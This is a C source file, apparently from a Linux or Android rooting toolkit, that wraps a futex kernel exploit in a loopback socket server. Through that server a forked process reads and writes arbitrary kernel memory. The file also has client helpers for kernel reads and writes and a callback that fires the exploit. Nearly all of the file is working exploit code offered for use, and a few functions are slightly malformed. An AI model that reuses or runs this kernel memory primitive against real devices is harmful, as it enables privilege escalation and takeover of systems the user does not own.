#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "futex.h"
#include "exploit_utils.h"

#define REQUEST_MAGIC   0x5553fd1c
#define RESULT_MAGIC    0x34cc98fa
#define SERVER_PORT     5553

#define KERNEL_START    0xc0000000
#define KERNEL_END      0xc7ffffff

struct kernel_memory_request_t {
  int magic;
  bool do_write_to_kernel;
  unsigned long address;
  int count;
};

static int server_socket = -1;

static bool create_server_socket(void)
{
  int sockfd;
  int yes;
  struct sockaddr_in addr = {0};
  int fd;

  if (server_socket >= 0) {
    return;
  }

  sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);

  yes = 1;
  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (void *)&yes, sizeof yes);

  addr.sin_family = AF_INET;
  addr.sin_port = htons(SERVER_PORT);
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

  if (bind(sockfd, (struct sockaddr *)&addr, sizeof addr) != 0) {
    close(sockfd);
    return false;
  }

  if (listen(sockfd, 1) != 0) {
    close(sockfd);
    return false;
  }

  server_socket = sockfd;
  return true;
}

static void
process_kernel_memory_request(int req_fd)
{
  struct kernel_memory_request_t req;
  static unsigned long values[FUTEX_REQUEUE_MAX_REQUEST_COUNT];
  int size;

  if (recv(req_fd, &req, sizeof req, 0) != sizeof (req)) {
    printf("Request read error\n");
    goto error_exit;
  }

  if (req.magic != REQUEST_MAGIC) {
    printf("Wrong magic\n");
    goto error_exit;
  }

  if (req.count <= 0 || req.count > FUTEX_REQUEUE_MAX_REQUEST_COUNT) {
    printf("Wrong request\n");
    goto error_exit;
  }

  size = sizeof (*values) * req.count;

  if (req.address < KERNEL_START || req.address + size - 1 > KERNEL_END) {
    printf("Wrong address\n");
    goto error_exit;
  }

  if (req.do_write_to_kernel) {
    if (recv(req_fd, values, size, 0) != size) {
      goto error_exit;
    }

    if (write_kernel_memory_by_pipe(req.address, values, size) != size) {
      goto error_exit;
    }

    req.magic = RESULT_MAGIC;

    send(req_fd, &req, sizeof req, 0);
  }
  else {
    if (read_kernel_memory_by_pipe(req.address, values, size) != size) {
      goto error_exit;
    }

    req.magic = RESULT_MAGIC;

    send(req_fd, &req, sizeof req, 0);
    send(req_fd, values, size, 0);
  }

error_exit:
  protect_from_oom_killer();
}

void
futex_process_kernel_memory_requests(void)
{
  printf("futex_exploit: Server started\n");

#ifndef DEBUG
  close(0);
  close(1);
  close(2);
#endif

  while (1) {
    int fd;

    fd = accept(server_socket, NULL, NULL);
    if (fd >= 0) {
      process_kernel_memory_request(fd);
    }

    close(fd);
  }
}

static void
init_futex_exploit(void)
{
  pid_t pid;

  if (!create_server_socket()) {
    return;
  }

#ifdef DEBUG
  printf("Server port ready\n");
#endif

  pid = fork();
  if (pid > 0) {
    close(server_socket);
    return;
  }

  if (futex_exploit_main()) {
    close(server_socket);
    return;
  }
}

static bool send_kernel_memory_request(struct kernel_memory_request_t *req, int *values)
{
  int sockfd;
  struct sockaddr_in addr = {0};
  int size;

  sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
  if (sockfd < 0) {
    printf("socket failed\n");
    return false;
  }

  addr.sin_family = AF_INET;
  addr.sin_port = htons(SERVER_PORT);
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

  if (connect(sockfd, (struct sockaddr *)&addr, sizeof addr) < 0) {
    printf("connect(): failed\n");
    return false;
  }

  size = sizeof (*values) * req->count;
  req->magic = REQUEST_MAGIC;

  if (write(sockfd, req, sizeof (*req)) != sizeof (*req)) {
    goto error_exit;
  }

  if (req->do_write_to_kernel) {
    if (write(sockfd, values, size) != size) {
      goto error_exit;
    }
  }

  if (read(sockfd, req, sizeof (*req)) != sizeof (*req)) {
    goto error_exit;
  }

  if (req->magic != RESULT_MAGIC) {
    goto error_exit;
  }

  if (!req->do_write_to_kernel) {
    if (read(sockfd, values, size) != size) {
      goto error_exit;
    }
  }

  close(sockfd);

  return true;

error_exit:
  close(sockfd);

  return false;
}

bool
futex_read_values_at_address(unsigned long address, int *values, int count)
{
  struct kernel_memory_request_t req;
  bool result = false;

  init_futex_exploit();

  memset(&req, 0, sizeof req);
  memset(values, 0, sizeof (*values) * count);

  req.do_write_to_kernel = false;
  req.address = address;
  req.count = count;

  return send_kernel_memory_request(&req, values);
}

bool
futex_write_values_at_address(unsigned long address, const int *values, int count)
{
  struct kernel_memory_request_t req;
  bool result = false;

  init_futex_exploit();

  memset(&req, 0, sizeof req);

  req.do_write_to_kernel = true;
  req.address = address;
  req.count = count;

  return send_kernel_memory_request(&req, (void *)values);
}

bool
futex_read_value_at_address(unsigned long address, int *value)
{
  return futex_read_values_at_address(address, value, 1);
}

bool
futex_write_value_at_address(unsigned long address, int value)
{
  return futex_write_values_at_address(address, &value, 1);
}

bool
futex_run_exploit(unsigned long int address, int value,
                 bool(*exploit_callback)(void* user_data), void *user_data)
{
  if (!futex_write_value_at_address(address, value)) {
    return false;
  }

  return exploit_callback(user_data);
}
